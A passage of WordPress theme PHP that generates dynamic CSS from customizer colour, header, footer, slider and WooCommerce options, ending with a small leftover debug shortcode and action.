					background-color: rgba('.$mobileMenuColors[0].', '.$mobileMenuColors[1].', '.$mobileMenuColors[2].', 0.9);	
				}
				.pm-dropmenu-active ul li a {
					border-top:2px solid '.$primaryColor.';
				}
				.pm-comment-box-container {
					border: 1px solid '.$dividerColor.';
					background-color:'.$commentBoxColor.';
				}
				.pm-comment {
					border-bottom: 1px solid '.$dividerColor.';
					border-top: 1px solid '.$dividerColor.';
				}
				.pm-textarea, .pm-comment-form-textarea {
					border: 1px solid '.$dividerColor.';	
				}
				blockquote {
					border-color: '.$dividerColor.' '.$dividerColor.' '.$dividerColor.' '.$blockQuoteColor.';	
				}
				.pm-news-post-title {
					background-color:'.$primaryColor.';	
				}
				.pm-single-meta-divider {
					background-color: '.$dividerColor.';
				}
				.pm-meta-options-list li i, .pm-single-meta-options-list li i {
					color: '.$postMetaIconColor.';	
				}
				.pm-news-post-image, .pm-event-item-img-container {
					border-bottom: 4px solid '.$primaryColor.';	
				}
				.pm-fat-footer h6, .pm-sidebar .pm-widget h6 {
					border-bottom: 3px solid '.$primaryColor.';		
				}
				.pm-sidebar-search-container {
					border: 1px solid '.$dividerColor.';	
				}
				.pm-recent-blog-post-details .pm-comment-count i {
					color:'.$primaryColor.';	
				}
				.pm-event-widget-img {
					border-bottom: 4px solid '.$primaryColor.';
				}
				.pm-event-widget-date-container {
					background-color: '.$primaryColor.';		
				}
				.nav-tabs > li.active > a, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a:focus {
					background-color: '.$primaryColor.';
				}
				.nav-tabs > li > a:hover {
					background-color:'.$primaryColor.';
				}
				.pm-woocom-item-short-description {
					border-bottom: 1px solid '.$dividerColor.';
    				border-top: 1px solid '.$dividerColor.';	
				}
				.product_meta, .pm-product-share-container {
					border-top: 1px solid '.$dividerColor.';		
				}
				.pm-cart-count {
					border-bottom: 1px solid '.$dividerColor.';
				}
				.pm-cart-items-container, .coupon, .cart-collaterals, .pm-cart-total-container, .pm-returning-customer, .tab-content {
					border: 1px solid '.$dividerColor.';	
				}
				.shop_table .cart-subtotal, .shop_table .shipping, .shop_table .order-total, .cart_totals .order-total {
					border-top: 1px solid '.$dividerColor.';	
				}
				.pm-checkout-tabs li:first-child {
					border-top: 1px solid '.$dividerColor.';
				}
				.pm-checkout-tabs li {
					border-bottom: 1px solid '.$dividerColor.';
					border-left: 1px solid '.$dividerColor.';
					border-right: 1px solid '.$dividerColor.';
				}
				.product_list_widget li, .product_list_widget li {
					border-bottom: 1px dotted '.$dividerColor.';	
				}
				.pm-gallery-item-img-container {
					border-bottom: 4px solid '.$primaryColor.' !important;	
				}
				.pm-menu-item-container {
					border: 1px solid '.$dividerColor.';
				}
				.pm-event-item-container {
					border: 1px solid '.$dividerColor.';	
				}
				.pm-event-item-divider {
					background-color: '.$dividerColor.';
				}
				.pm-event-item-date {
					background-color: '.$primaryColor.';
				}
				.pm-store-item-date {
					background-color: '.$primaryColor.';
				}
				.quantity .minus, .quantity .plus {
					background-color: '.$primaryColor.';	
				}
				.pm-isotope-filter-container {
					background-color:'.$isotopeMenuBackground.' !important;			
				}
				.pm-menu-item-img-container {
					border-bottom: 4px solid '.$primaryColor.' !important;
				}
				.pm-event-item-img-container {
					border-bottom: 4px solid '.$primaryColor.' !important;
				}
				.pm-menu-item-price {
					background-color: '.$primaryColor.' !important;	
				}
				.pm-featured-header-container {
					border-top: 4px solid '.$primaryColor.' !important;	
				}
				.pm-isotope-filter-system li a.current {
					border-top: 3px solid '.$primaryColor.' !important;	
					color: '.$primaryColor.' !important;	
				}
				.pm-footer-navigation li a:hover {
					color:'.$primaryColor.';	
				}
				.pagination_multi li {
					background-color:'.$primaryColor.' !important;		
				}
				.product_meta .posted_in a, .product_meta .tagged_as a {
					color:'.$primaryColor.' !important;	
				}
				.pm-pagination li.current {
					background-color:'.$primaryColor.';
				}
				.product_meta .posted_in a:hover, .product_meta .tagged_as a:hover {
					color:#333 !important;	
				}
				.pm-store-item-divider {
					background-color: '.$dividerColor.';	
				}
				.pm-gallery-item-container {
					border: 1px solid '.$dividerColor.';
				}
				.pm-divider {
					background-color: '.$dividerColor.';
				}
				.comment-text .meta strong {
					color:'.$primaryColor.' !important;		
				}
				.products .product {
					border: 1px solid '.$dividerColor.';
				}
				#wp-calendar tbody td:hover { 
					background: '.$primaryColor.';
				}
				.pm-sidebar .widget_categories ul a:before, .pm-sidebar .widget_pages ul li:before, .pm-sidebar .widget_meta ul li:before { 
					color:'.$primaryColor.' !important;	
				}
				.pm-widget-footer .widget_categories ul a:before {
					color:'.$primaryColor.' !important;	
				}
				.pm-widget-footer .widget_categories ul a:hover {
					color:'.$primaryColor.' !important;	
				}
				.pm-widget-footer .widget_meta ul li a:hover, .pm-widget-footer .widget_categories ul li a:hover {
					color:'.$primaryColor.';	
				}
				.pm-widget-footer .widget_archive ul li:before {
					color:'.$primaryColor.';		
				}
				.pm-widget-footer .widget_recent_entries ul li a:hover {
					color:'.$primaryColor.';		
				}
				.pm-widget-footer .widget_archive ul li a:hover {
					color:'.$primaryColor.';			
				}
				.pm-widget-footer .widget_pages ul li:before {
					color:'.$primaryColor.';		
				}
				.pm-widget-footer .widget_pages ul li a:hover {
					color:'.$primaryColor.';		
				}
				.widget_shopping_cart_content .buttons .wc-forward {
					background-color:'.$primaryColor.' !important;	
				}
				.widget_shopping_cart_content .buttons .wc-forward:hover {
					background-color:#333 !important;	
				}
				.description_tab.active, .additional_information_tab.active, .reviews_tab.active {
					background-color:'.$primaryColor.' !important;
					color:white;
				}
				.pm-product-social-icons li a {
					background-color:'.$primaryColor.';	
				}
				#pm-product-img-single {
					border-bottom:4px solid '.$primaryColor.';
				}
				.pm-rounded-btn.pm-add-to-cart {
					background-color:'.$secondaryColor.' !important;	
				}
				.pm-rounded-btn.pm-add-to-cart:hover {
					background-color:#333 !important;
				}
				.pm-product-img-container { 
					border-bottom:3px solid '.$primaryColor.' !important;
				}
				.flex-direction-nav a {
					background-color:'.$primaryColor.';
				}
				.panel-default > .panel-heading {

					background-color:'.$secondaryColor.';
				}
				.panel-title i {
					background-color:'.$primaryColor.';	
				}
				.pm-nav-tabs > li.active > a, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a:focus {
					background-color: '.$primaryColor.' !important;
				}
				.pm-nav-tabs > li > a {
					background-color:'.$secondaryColor.' !important;
				}
				.pm-nav-tabs > li:last-child > a { 
					background-color:'.$secondaryColor.' !important;
				}
				.pm-nav-tabs > li > a:hover {
					background-color:'.$primaryColor.' !important;
				}
				.pm-nav-tabs {
					border-bottom: 1px solid '.$secondaryColor.';
				}
				.pm-image-border {
					border-bottom:4px solid '.$primaryColor.' !important;	
					margin-bottom:20px;
				}
				.pm-testimonials-widget-controls li a {
					color:'.$primaryColor.' !important;		
				}
				.pm-rounded-btn.event-fan-page, .pm-rounded-btn.prettyPhoto-btn {
					background-color:'.$secondaryColor.' !important;		
				}
				.pm-rounded-btn.event-fan-page:hover, .pm-rounded-btn.prettyPhoto-btn:hover {
					background-color:#333 !important;		
				}
				.ui-widget-header {
					background:none repeat scroll 0 0 '.$primaryColor.' !important;
				}
				.pm-rounded-btn, .form-row input[type=submit] {
					background-color:'.$primaryColor.' !important;			
				}
				.form-row input[type=submit]:hover {
					background-color:#333 !important;			
				}
				.pm-recent-blog-post-details a:hover {
					color:'.$primaryColor.' !important;
				}
				.tweet_container {
					background-color:'.$primaryColor.' !important;		
				}
				.tweet_container:before {
					border-right: 8px solid '.$primaryColor.';	
				}
				.pm-sidebar .widget_archive ul li:before {
					color:'.$primaryColor.' !important;		
				}
				.pm-sidebar .tagcloud a {
					background-color:'.$primaryColor.' !important;	
				}
				.pm-widget-footer .tagcloud a {
					background-color:'.$primaryColor.' !important;		
				}
				.pm-widget-footer .widget_meta ul li:before {
					color:'.$primaryColor.' !important;		
				}
				.pm-sidebar-search-container i {
					color:'.$primaryColor.';		
				}
				.pm-rounded-submit-btn {
					background-color:'.$primaryColor.' !important;	
				}
				.pm-rounded-btn.pm-comment-reply {
					background-color:'.$primaryColor.' !important;		
				}
				.pm-single-post-img-container {
					border-bottom: 5px solid '.$primaryColor.';	
				}
				.pm-single-post-title {
					background-color:'.$primaryColor.';		
				}
				.pm-single-post-share-list li a {
					background-color:'.$primaryColor.';	
				}
				.pm-single-post-share-container {
					border-bottom: 3px solid '.$primaryColor.';
					border-top: 3px solid '.$primaryColor.';
				}
				.pm-likes-title span {
					color: '.$primaryColor.';
				}
				.pm-tags-list li a {
					color: '.$primaryColor.' !important;	
				}
				.pm-tags-list li a:hover {
					color:#333 !important;	
				}
				.pm-comment-date a {
					color: '.$primaryColor.' !important;	
				}
				.pm-comment-name {
					color: '.$primaryColor.' !important;	
				}
				.logged-in-as a {
					color: '.$primaryColor.' !important;	
				}
				.form-submit input[type=submit] {
					background-color:'.$primaryColor.';		
				}
				.pm-footer-copyright a {
					color:'.$primaryColor.';		
				}
				.pm-footer-social-icons li a i:hover {
					background-color:'.$secondaryColor.';	
				}
				.pm-page-social-icons li a {
					background-color:'.$primaryColor.';		
				}
				.pm-sub-header-breadcrumbs-ul p {
					color:'.$primaryColor.' !important;	
				}
				.pm-sub-header-breadcrumbs-ul p a:hover {
					color:'.$primaryColor.';	
				}
				.pm-sub-header-breadcrumbs-ul p.current {
					color:'.$primaryColor.';	
				}
			
				.pm-footer-subscribe-submit-btn {
					background-color:'.$primaryColor.';	
				}
				.pm-footer-subscribe-field {
					border-color:'.$primaryColor.';	
				}
				.pm-footer-social-icons li a i {
					background-color: '.$primaryColor.';	
				}
				.pm-footer-social-info-container, .pm-footer-subscribe-container {
					border-top: 3px solid '.$primaryColor.';
				}
				#back-top {
					background-color:'.$primaryColor.';		
				}
				.pm-sub-menu-book-event a {
					background-color:'.$primaryColor.';	
				}
				.pm-sub-menu-info p i, .pm-dropmenu i, .pm-sub-navigation a i {
					color:'.$primaryColor.';	
				}
				.pm-dropmenu-active ul li:hover {
					background-color:'.$primaryColor.';
				}
				.sf-menu a:hover {
					color:'.$primaryColor.';		
				}
				.sf-menu ul {
					border-top: 3px solid '.$primaryColor.';
				}
				.sf-menu ul li {
					border-bottom: 1px solid '.$primaryColor.';
				}
				.sf-menu ul li:before {
					color:'.$primaryColor.';			
				}
				.pm-search-container {
					background-color:'.$primaryColor.';	
				}
				.pm-dots span {
					background-color:'.$primaryColor.';	
				}
				body {
					background-color:'.$pageBackgroundColor.';	
				}
				.pm_quick_contact_field.Light, .pm_quick_contact_textarea.Light {
					border: 1px solid '.$dividerColor.';	
				}
				.pm-textfield:focus, .pm-textarea:focus {
					background-color:'.$primaryColor.';
				}
				.pm_quick_contact_field:focus, .pm_quick_contact_textarea:focus {
					background-color:'.$primaryColor.' !important;
					color:white;	
				}
				.pm-widget-footer .widget_categories ul li {
					border-bottom: 1px solid '.$dividerColor.';
				}
			';
			
			//Header Options
			$mainMenuBackgroundImage = get_theme_mod('mainMenuBackgroundImage');
			$mainNavColor = get_option('mainNavColor');
			$mainNavColors = pm_ln_hex2rgb($mainNavColor); //Array of colors R,G,B
			$subpageHeaderBackgroundColor = get_option('subpageHeaderBackgroundColor');
			$dropMenuIndicator = get_theme_mod('dropMenuIndicator');
			$subMenuBackgroundImage = get_theme_mod('subMenuBackgroundImage'); //img
			$subMenuBackgroundColor = get_option('subMenuBackgroundColor');
			$dropMenuBackgroundColor = get_option('dropMenuBackgroundColor');
			$dropMenuBackgroundColors = pm_ln_hex2rgb($dropMenuBackgroundColor); //Array of colors R,G,B
			$getDropMenuOpacity = get_theme_mod('dropMenuOpacity');
			$dropMenuOpacity = $getDropMenuOpacity == '' ? 80 : $getDropMenuOpacity;
			$dropMenuOpacityFinal = $dropMenuOpacity / 100; //divide this to convert value decimal
			$getHeaderPadding = get_theme_mod('headerPadding');
			$headerPadding = $getHeaderPadding == '' ? 40 : $getHeaderPadding;
			$getHeaderHeight = get_theme_mod('headerHeight');
			$headerHeight = $getHeaderHeight == '' ? 170 : $getHeaderHeight;
			$menuSeperator = get_theme_mod('menuSeperator');
									
			//Header styles
			if($subMenuBackgroundImage !== ''){
				echo '
					.pm-sub-menu-container {
						background-image:url('.$subMenuBackgroundImage.');	
						background-color:'.$subMenuBackgroundColor.';
					}
				';
			} else {
				echo '
					.pm-sub-menu-container {
						background-color:'.$subMenuBackgroundColor.';
					}
				';	
			}
			
			echo '
				header {
					padding:'.$headerPadding.'px 0;
					height:'.$headerHeight.'px;
				}
			';
			
			if($menuSeperator !== '') {
				echo "
					.sf-menu li:after {
						content:'\\$menuSeperator';
						font-family:'FontAwesome';
						font-size:6px;
						color:".$primaryColor.";	
						margin:-4px 8px 0 8px;
						position:relative;
						top:-3px;
					}
				";	
			}
			
			if($dropMenuIndicator !== '') {
				echo '
					.sf-sub-indicator {
						background:url("'.$dropMenuIndicator.'") no-repeat scroll 0 -100px rgba(0, 0, 0, 0) !important;
					}
				';
			} else {
				echo '
					.sf-sub-indicator {
						background:url("'.get_template_directory_uri().'/css/superfish/img/arrows-white.png") no-repeat scroll 0 -100px rgba(0, 0, 0, 0) !important;
					}
				';	
			}
			
			if($mainMenuBackgroundImage !== '') {
				
				echo '
					header {
						background-image:url('.$mainMenuBackgroundImage.');	
					}
				';
				
			} else {
				
				echo '
					header {
						height:auto !important;
						background-color:rgba('.$mainNavColors[0].','.$mainNavColors[1].','.$mainNavColors[2].',.8);
					}
				';
				
			}
			
			echo '
				header.fixed {
					background-color:rgba('.$mainNavColors[0].','.$mainNavColors[1].','.$mainNavColors[2].',.8);		
				}
				.pm-sub-header-container {
					background-color:'. $subpageHeaderBackgroundColor .';	
				}
				.sf-menu ul {
					background-color:rgba('.$dropMenuBackgroundColors[0].','.$dropMenuBackgroundColors[1].','.$dropMenuBackgroundColors[2].', '.$dropMenuOpacityFinal.');	
				}
			';
			
			
			//Footer Options
			$newsletterFieldColor = get_option('newsletterFieldColor');
			$footerWidgetTitleColor = get_option('footerWidgetTitleColor');
			$fatFooterBackgroundColor = get_option('fatFooterBackgroundColor');
			$footerBackgroundColor = get_option('footerBackgroundColor');
			$subFooterBackgroundColor = get_option('subFooterBackgroundColor');
			$footerBackgroundImage = get_theme_mod('footerBackgroundImage');
			$newsletterFieldColor = get_option('newsletterFieldColor');
			$returnToTopIcon = get_theme_mod('returnToTopIcon');
			$fatFooterBackgroundImage = get_theme_mod('fatFooterBackgroundImage');
			
			//Footer styles
			echo '
				.pm-footer-subscribe-field {
					background-color:'.$newsletterFieldColor.';		
				}
				footer {
					background-color:'.$subFooterBackgroundColor.';		
				}
				
			';
			
			if( !empty($fatFooterBackgroundImage) ){
				echo '
					.pm-fat-footer {
						background-color: '.$fatFooterBackgroundColor.';	
						background-image:url("'.$fatFooterBackgroundImage.'");	
					}	
				';
			} else {
				echo '
					.pm-fat-footer {
						background-color: '.$fatFooterBackgroundColor.';	
					}	
				';
			}
			
			echo "
				#back-top:before {
					content:'\\$returnToTopIcon' !important;
				}
			";
			
			if($footerBackgroundImage !== '') {
				
				echo '
					.pm-footer-copyright {
						background-image:url('.$footerBackgroundImage.');	
						background-color:'.$footerBackgroundColor.';		
					}
				';
				
			} else {
				
				echo '
					.pm-footer-copyright {
						background-color:'.$footerBackgroundColor.';	
					}
				';
				
			}
						
			//Pulse Slider options
			$buttonColor = get_option('buttonColor');
			$textBackgroundColor = get_option('textBackgroundColor');
			$textBackgroundColors = pm_ln_hex2rgb($textBackgroundColor); //Array of colors R,G,B
			$getSliderHeightMobile = get_theme_mod('sliderHeightMobile');
			$sliderHeightMobile = $getSliderHeightMobile == '' ? 600 : $getSliderHeightMobile;
			
			$getTextBackgroundOpacity = get_theme_mod('textBackgroundOpacity');
			$textBackgroundOpacity = $getTextBackgroundOpacity == '' ? 80 : $getTextBackgroundOpacity;
			$textBackgroundOpacityFinal = $textBackgroundOpacity / 100; //divide this to convert value decimal
			
			//Pulse Slider styles
			echo '
				.pm-slide-btn {
					background-color:'.$buttonColor.';	
				}
				.pm-caption h1, .pm-caption-decription {
					background-color: rgba('.$textBackgroundColors[0].', '.$textBackgroundColors[1].', '.$textBackgroundColors[2].', '.$textBackgroundOpacityFinal.');	
				}
				@media (max-width: 480px) {
					.pm-slider {
						height:'.$sliderHeightMobile.'px !important; 
					}					
				}
			';
			
			//Shortcode options
			$quote_box_color = get_option('quote_box_color');
			$fancy_title_border = get_option('fancy_title_border');
			$testimonial_widget_color = get_option('testimonial_widget_color');
			
			
			echo '
				.pm-single-testimonial-box:before {
					border-top: 8px solid '.$quote_box_color.';	
				}
				.pm-single-testimonial-box {
					background-color:'.$quote_box_color.';
				}
				.pm-fancy span:before,
				.pm-fancy span:after {
				  border-bottom: 1px solid '.$fancy_title_border.';
				  border-top: 1px solid '.$fancy_title_border.';
				}
				.pm-testimonials-widget-box:before {
					border-left: 8px solid transparent;
					border-right: 8px solid transparent;
					border-top: 8px solid '.$testimonial_widget_color.';
				}
				.pm-testimonials-widget-box {
					background-color:'.$testimonial_widget_color.';	
				}
			';
			
			//Woocommerce options
			$product_image_bg_color = get_option('product_image_bg_color');
			$sale_box_color = get_option('sale_box_color');
			$tabs_background = get_option('tabs_background');
			$form_background = get_option('form_background');
			
			echo '
				.pm-added-to-cart-icon, #pm-product-img-single .onsale {
					background-color:'.$sale_box_color.';	
				}
				#pm-product-img-single {
					background-color:'.$product_image_bg_color.';
				}
				.woocommerce-tabs .panel, .woocommerce-tabs .tabs li {
					background-color:'.$tabs_background.';	
				}
				.nav-tabs > li > a {
					background-color:'.$form_background.';	
				}
				.tab-content {
					background-color:'.$form_background.';		
				}
			';
			
			//Alert options
			$alert_success_color = get_option('alert_success_color');
			$alert_info_color = get_option('alert_info_color');
			$alert_warning_color = get_option('alert_warning_color');
			$alert_danger_color = get_option('alert_danger_color');
			$alert_notice_color = get_option('alert_notice_color');
			
			echo '
				.alert-warning {
					background-color:'.$alert_warning_color.';	
				}
				
				.alert-success {
					background-color:'.$alert_success_color.';	
				}
				
				.alert-danger {
					background-color:'.$alert_danger_color.';	
				}
				
				.alert-info {
					background-color:'.$alert_info_color.';	
				}
				
				.alert-notice {
					background-color:'.$alert_notice_color.';	
	
			';
						
		 ?>
	</style>
    
    <?php
}
add_shortcode('test','test');
function test()
{
    do_action('hello');
    echo 'asd';
}
add_action('hello','hello');
function hello(){
    echo 'hello';
}